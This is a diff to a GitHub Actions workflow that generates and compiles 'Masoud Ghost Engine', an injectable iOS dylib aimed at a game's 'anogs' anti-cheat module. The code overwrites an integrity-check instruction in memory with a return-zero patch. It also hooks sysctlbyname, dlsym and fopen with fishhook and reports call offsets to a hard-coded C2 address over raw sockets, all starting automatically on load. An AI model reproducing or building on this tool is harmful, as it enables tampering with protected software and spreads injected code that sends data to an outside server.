@@ -1,4 +1,4 @@
-name: Imperial V-MAX - anogs Runtime Patcher
+name: Imperial V-MAX - Ghost Engine (Lag-Free Radar + Patcher)
 
 on:
   push:
@@ -6,118 +6,178 @@ on:
   workflow_dispatch:
 
 jobs:
-  build_patcher:
-    name: Compile anogs Live Memory Patcher
+  build_ghost_mode:
+    name: Compile Ghost Engine Dylib
     runs-on: macos-latest
 
     steps:
       - name: Checkout Code
         uses: actions/checkout@v4
 
+      - name: Download Fishhook
+        run: |
+          mkdir -p jni
+          curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.c -o jni/fishhook.c
+          curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.h -o jni/fishhook.h
+
       - name: Generate C++ Payload (Main.mm)
         run: |
-          cat <<'EOF' > main.mm
+          cat <<'EOF' > jni/main.mm
           #import <Foundation/Foundation.h>
           #import <mach-o/dyld.h>
-          #import <mach/mach.h>
           #import <sys/mman.h>
+          #import <sys/socket.h>
+          #import <arpa/inet.h>
+          #import <dlfcn.h>
+          #import <sys/sysctl.h>
           #import <libkern/OSCacheControl.h>
+          #include "fishhook.h"
 
-          /**
-           * ========================================================
-           * 🛡️ MASOUD SECURITY LAB - RUNTIME MEMORY PATCHER
-           * 🎯 TARGET: anogs.dylib
-           * ⚙️ ACTION: Safely blind the Integrity Checker at 0x459C
-           * ========================================================
-           */
+          // ⚠️ C2 Server Configuration (Masoud RDP)
+          #define C2_IP "44.192.33.117"
+          #define C2_PORT 8080
 
-          // 1. تعريف البايتات السحرية (MOV X0, #0) في معمارية ARM64
-          // هذا الكود يخبر المعالج بإرجاع قيمة "صفر" بدون التسبب في كراش
-          uint8_t safe_patch_bytes[] = {0x00, 0x00, 0x80, 0xD2};
+          // ==========================================
+          // 🛡️ MASOUD GHOST ENGINE - SHARED STATE
+          // ==========================================
+          static uintptr_t g_anogs_base = 0;
+          static uintptr_t g_anogs_slide = 0;
+          static uintptr_t g_anogs_end = 0;
+          static bool g_anogs_found = false;
+          static NSMutableSet* g_reported_offsets = nil; // لمنع التكرار والكراش
 
-          // 2. دالة كسر حماية الذاكرة وزرع البايتات
-          void PatchMemory(uintptr_t address, uint8_t* patch_data, size_t length) {
-              // حساب بداية الصفحة في الذاكرة (ضروري لنظام iOS)
-              uintptr_t page_start = address & ~(PAGE_SIZE - 1);
-              
-              // أ: إزالة الحماية وجعل الذاكرة قابلة للقراءة والكتابة والتنفيذ (RWX)
-              mprotect((void*)page_start, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC);
-              
-              // ب: زرع البايتات الجديدة فوق القديمة
-              memcpy((void*)address, patch_data, length);
-              
-              // ج: تنظيف ذاكرة التخزين المؤقت للمعالج (Instruction Cache)
-              // استخدام دالة أبل الرسمية لمنع أخطاء التجميع والكراش
-              sys_icache_invalidate((void*)address, length);
-              
-              // د: إعادة الحماية للذاكرة (قراءة وتنفيذ فقط RX) لإخفاء الأثر
-              mprotect((void*)page_start, PAGE_SIZE, PROT_READ | PROT_EXEC);
+          static int (*orig_sysctlbyname)(const char *name, void *oldp, size_t *oldlenp, void *newp, size_t newlen);
+          static void* (*orig_dlsym)(void* handle, const char* symbol);
+          static FILE* (*orig_fopen)(const char *filename, const char *mode);
+
+          // إرسال البيانات (بشكل غير متزامن وآمن)
+          void SendToRadar(NSDictionary *data) {
+              dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
+                  NSData *json = [NSJSONSerialization dataWithJSONObject:data options:0 error:nil];
+                  if (!json) return;
+                  int sock = socket(AF_INET, SOCK_STREAM, 0);
+                  if (sock < 0) return;
+                  struct sockaddr_in srv;
+                  srv.sin_family = AF_INET; srv.sin_port = htons(C2_PORT);
+                  inet_pton(AF_INET, C2_IP, &srv.sin_addr);
+                  struct timeval tv = {1, 0}; setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+                  if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) == 0) send(sock, [json bytes], [json length], 0);
+                  close(sock);
+              });
           }
 
-          // 3. دالة البحث عن anogs وتطبيق الباتش
-          void ExecuteAnogsPatch() {
-              for (uint32_t i = 0; i < _dyld_image_count(); i++) {
-                  const char* image_name = _dyld_get_image_name(i);
+          // فحص سريع جداً (O(1)) لمنع تعليق اللعبة
+          void AnalyzeAndReport(const char* func_name, const char* target) {
+              if (!g_anogs_found) return; // إذا الجاسوس بعده ما شغال، اخرج فوراً
+
+              uintptr_t ret_addr = (uintptr_t)__builtin_return_address(0);
+              
+              // فحص رياضي سريع جداً بدل البحث في النصوص (يمنع اللاك والكراش)
+              if (ret_addr >= g_anogs_base && ret_addr < g_anogs_end) {
+                  uintptr_t real_offset = ret_addr - g_anogs_slide;
+                  NSString* offsetStr = [NSString stringWithFormat:@"0x%lx", real_offset];
                   
-                  if (strstr(image_name, "anogs")) {
-                      // الحصول على العنوان الأساسي للملف في الذاكرة (Base Address)
-                      uintptr_t base_addr = (uintptr_t)_dyld_get_image_header(i);
-                      
-                      // الأوفست الذهبي الذي اكتشفه مسعود
-                      uintptr_t target_offset = 0x459C;
-                      
-                      // حساب العنوان الفعلي في الذاكرة
-                      uintptr_t effective_address = base_addr + target_offset;
-                      
-                      // تنفيذ عملية الزرع
-                      PatchMemory(effective_address, safe_patch_bytes, sizeof(safe_patch_bytes));
-                      
-                      NSLog(@"[MASOUD LAB] 🦅 BOOM! anogs integrity check blinded at 0x%lx", effective_address);
-                      return; // الخروج بعد نجاح العملية
+                  // 🔥 نظام مكافحة التكرار: نرسل كل أوفست مرة واحدة فقط!
+                  @synchronized(g_reported_offsets) {
+                      if ([g_reported_offsets containsObject:offsetStr]) return;
+                      [g_reported_offsets addObject:offsetStr];
                   }
+                  
+                  SendToRadar(@{
+                      @"func": [NSString stringWithUTF8String:func_name],
+                      @"offset": offsetStr,
+                      @"target": target ? [NSString stringWithUTF8String:target] : @"NULL",
+                      @"caller": @"anogs"
+                  });
               }
           }
 
-          // 4. خيط مراقبة يعمل في الخلفية لانتظار تحميل anogs
-          void StartMemorySniper() {
+          // ==========================================
+          // ⚔️ خطافات الصيد السريعة
+          // ==========================================
+          int hk_sysctlbyname(const char *name, void *oldp, size_t *oldlenp, void *newp, size_t newlen) {
+              AnalyzeAndReport("sysctlbyname", name);
+              return orig_sysctlbyname(name, oldp, oldlenp, newp, newlen);
+          }
+
+          void* hk_dlsym(void* handle, const char* symbol) {
+              AnalyzeAndReport("dlsym", symbol);
+              return orig_dlsym(handle, symbol);
+          }
+
+          FILE* hk_fopen(const char *filename, const char *mode) {
+              AnalyzeAndReport("fopen", filename);
+              return orig_fopen(filename, mode);
+          }
+
+          // ==========================================
+          // 💣 المترصد الحي (Live Memory Patcher)
+          // ==========================================
+          void ApplyMasoudPatch(uintptr_t base_addr) {
+              uintptr_t target_offset = 0x459C; // أوفست الجاسوس
+              uintptr_t effective_addr = base_addr + target_offset;
+              
+              uint8_t safe_patch_bytes[] = {0x00, 0x00, 0x80, 0xD2}; // MOV X0, #0
+              
+              uintptr_t page_start = effective_addr & ~(PAGE_SIZE - 1);
+              mprotect((void*)page_start, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC);
+              memcpy((void*)effective_addr, safe_patch_bytes, sizeof(safe_patch_bytes));
+              sys_icache_invalidate((void*)effective_addr, sizeof(safe_patch_bytes));
+              mprotect((void*)page_start, PAGE_SIZE, PROT_READ | PROT_EXEC);
+              
+              SendToRadar(@{@"func": @"BOOM! PATCHED", @"offset": @"0x459C", @"target": @"MOV X0, #0", @"caller": @"Masoud_Ghost"});
+          }
+
+          // بحث لمرة واحدة فقط بالخلفية لعدم إرهاق المعالج
+          void InitializeGhostEngine() {
               dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-                  bool isPatched = false;
-                  // حلقة تكرارية تفحص الذاكرة كل ثانية
-                  while(!isPatched) {
+                  while (!g_anogs_found) {
                       for (uint32_t i = 0; i < _dyld_image_count(); i++) {
-                          if (strstr(_dyld_get_image_name(i), "anogs")) {
-                              // إذا وجدنا الملف، ننتظر ثانية واحدة ليكتمل تحميله بالكامل
-                              sleep(1); 
-                              ExecuteAnogsPatch();
-                              isPatched = true;
+                          const char* image_name = _dyld_get_image_name(i);
+                          if (strstr(image_name, "anogs")) {
+                              g_anogs_slide = _dyld_get_image_vmaddr_slide(i);
+                              g_anogs_base = (uintptr_t)_dyld_get_image_header(i);
+                              g_anogs_end = g_anogs_base + 0x8000000; // تغطية مساحة الملف بالذاكرة
+                              
+                              sleep(1); // استقرار
+                              ApplyMasoudPatch(g_anogs_base); // تدمير الفحص
+                              
+                              g_anogs_found = true;
                               break;
                           }
                       }
-                      if (!isPatched) {
-                          sleep(1); // إذا لم نجده، انتظر ثانية وحاول مرة أخرى
-                      }
+                      if (!g_anogs_found) sleep(1);
                   }
               });
           }
 
-          // نقطة البداية (تعمل تلقائياً عند حقن الدايلب)
           __attribute__((constructor))
-          static void init_patcher() {
-              NSLog(@"[MASOUD LAB] 🛡️ Live Memory Patcher Initialized. Waiting for target...");
-              StartMemorySniper();
+          static void start_masoud_engine() {
+              g_reported_offsets = [[NSMutableSet alloc] init];
+              
+              SendToRadar(@{@"func": @"RADAR_INIT", @"offset": @"0x0", @"target": @"Ghost Engine Active", @"caller": @"System"});
+              
+              struct rebinding hooks[] = {
+                  {"sysctlbyname", (void *)hk_sysctlbyname, (void **)&orig_sysctlbyname},
+                  {"dlsym", (void *)hk_dlsym, (void **)&orig_dlsym},
+                  {"fopen", (void *)hk_fopen, (void **)&orig_fopen}
+              };
+              rebind_symbols(hooks, 3);
+              
+              InitializeGhostEngine();
           }
           EOF
 
-      - name: Compile Dylib
+      - name: Compile Ghost Engine
         run: |
           clang++ -dynamiclib -std=c++11 -arch arm64 \
           -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
-          main.mm -o Masoud-Live-Patcher.dylib \
+          jni/main.mm jni/fishhook.c -o Masoud-Ghost-Engine.dylib \
           -framework Foundation
-          strip -x Masoud-Live-Patcher.dylib
+          strip -x Masoud-Ghost-Engine.dylib
 
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Masoud-Live-Patcher
-          path: Masoud-Live-Patcher.dylib
+          name: Masoud-Ghost-Engine
+          path: Masoud-Ghost-Engine.dylib
